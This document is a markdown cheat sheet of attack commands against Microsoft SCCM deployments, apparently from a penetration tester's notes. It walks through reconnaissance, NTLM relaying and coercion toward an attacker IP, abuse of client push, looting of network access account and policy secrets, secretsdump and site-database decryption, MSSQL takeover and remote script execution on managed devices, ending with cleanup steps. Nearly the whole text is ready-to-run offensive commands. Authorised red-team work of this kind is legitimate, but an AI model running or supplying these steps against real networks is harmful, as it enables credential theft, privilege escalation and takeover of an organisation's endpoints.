# SCCM

## recon
- `sccmhunter.py find -u <user> -p <password> -d <domain> -dc-ip <dc_ip> -debug`
  - `sccmhunter.py show -all`
- `ldeep ldap -u <user> -p <password> -d <domain> -s ldap://<dc_ip> sccm`
- `nxc smb <sccm_server> -u <user> -p <password> -d <domain> --shares`
 
## Creds-1 No credentials >>> NAA credentials || User + Pass
- Extract from pxe See no creds >>> PXE

##  Elevate-1:Relay on site systems Simple user >>> Admin on Site system
- coerce sccm site server
  - `ntlmrelayx.py -tf <site_systems> -smb2support`

## Elevate-2:Force client push Simple user >>> Admin
- `ntlmrelayx.py -t <sccm_server> -smb2support -socks # listen connection`
  - `SharpSCCM.exe invoke client-push -mp <sccm_server>.<domain> -sc <site_code> -t <attacker_ip> # Launch client push install`
    - `proxychains smbexec.py -no-pass <domain>/<socks_user>@<sccm_server>`
      - cleanup

## Elevate-3:Automatic client push Simple user >>> Relay ntlm
- Create DNS A record for non existing computer x
  - `dnstool.py -u '<domain>\<user>' -p <pass>  -r <newcomputer>.<domain> -a add -t A -d <attacker_ip> <dc_ip>`
    -  Enroll new computer x in AD  then remove host SPN from the machine account
      - `setspn -D host/<newcomputer> <newcomputer> setspn -D host/<newcomputer>.<domain> <newcomputer>`
        - wait 5m for client push
          - `ntlmrelayx.py -tf <no_signing_target> -smb2support -socks`
            - cleanup

## CRED-6 Loot creds >>> User + Pass
- SCCM SMB service (445/TCP) on a DP
  - `cmloot.py <domain>/<user>:<password>@<sccm_dp> -cmlootinventory sccmfiles.txt`
- SCCM HTTP service (80/TCP or 443/TCP) on a DP
  - `SCCMSecrets.py policies -mp http://<management_point> -u '<machine_account>$' -p '<machine_password>' -cn '<client_name>'`
  - `SCCMSecrets.py files -dp http://<distribution_point> -u '<user>' -p '<password>'`
  - `sccm-http-looter -server <ip_dp>`

## Takeover-1:relay to mssql db Simple user >>> SCCM ADMIN
- SCCM MSSQL != SSCM server
  - `sccmhunter.py mssql -u <user> -p <password> -d <domain> -dc-ip <dc_ip> -debug -tu <target_user> -sc <site_code> -stacked`
    - `ntlmrelayx.py -smb2support -ts -t mssql://<sccm_mssql> -q "<query>"`
      - coerce sccm_mssql -> attacker
        - `sccmhunter.py admin -u <target_user>@<domain> -p '<password>' -ip <sccm_ip>` 

## Takeover-2:relay to mssql server Simple user >>> Admin MSSQL
- SCCM MSSQL != SSCM server
  - `ntlmrelayx.py -t <sccm_mssql> -smb2support -socks`
    - coerce sccm_server 
      - `proxychains smbexec.py -no-pass <domain>/'<sccm_server>$'@<sccm_ip>`

## Creds-2:Policy Request Credentials Simple user >>> User + Pass
- add computer
  - `sccmwtf.py newcomputer newcomputer.<domain> <target> '<domain>\<computer_added>$' '<computer_pass>'`
    - get NetworkAccessUsername and NetworkAccessPassword
      - `policysecretunobfuscate.py`
        - delete device created after sccmadmin
  - `SharpSCCM.exe get secrets -r newcomputer -u <computer_added>$ -p <computer_pass>"`
    - cleanup

## Creds-3Creds-4 Computer Admin user >>> NAA credentials
- `dploot.py sccm -u <admin> -p '<password>' <sccm_target>`
- `sccmhunter.py dpapi  -u <admin> -p '<password>' -target <sccm_target> -debug`
- `SharpSCCM.exe local secrets -m disk`
- `SharpSCCM.exe local secrets -m wmi`

## Creds-5 SCCM admin >>> Site DB credentials
- `secretsdump.py <domain>/<admin>:'<pass>'@<sccm_target>`
  - `mssqlclient.py -windows-auth -hashes '<sccm_target_hashNT>' '<domain>/<sccm_target>$'@<sccm_mssql>`
    - `use CM_<site_code>;`
      - `SELECT * FROM SC_UserAccount;`
        - `sccmdecryptpoc.exe <cyphered_value>`

## EXEC-1/2 SCCM admin >>> lat
- `SharpSCCM.exe exec -p <binary> -d <device_name> -sms <SMS_PROVIDER> -sc <SITECODE> --no-banner`
- `sccmhunter.py admin -u <user>@<domain> -p '<password>' -ip <sccm_ip>`
    - `get_device <hostname>`
      - `interact <device_id>`
        - `script xploit.ps1`

## Cleanup
- `SharpSCCM.exe get devices -sms <SMS_PROVIDER> -sc <SITECODE> -n <NTLMRELAYX_LISTENER_IP> -p "Name" -p "ResourceId" -p "SMSUniqueIdentifier"`
  - `SharpSCCM.exe remove device GUID:<GUID> -sms <SMS_PROVIDER> -sc <SITECODE>`

## Post exploit
- as sccm admin
  - `SCCMHound.exe --server <server> --sitecode <sitecode>` >>> Users sessions
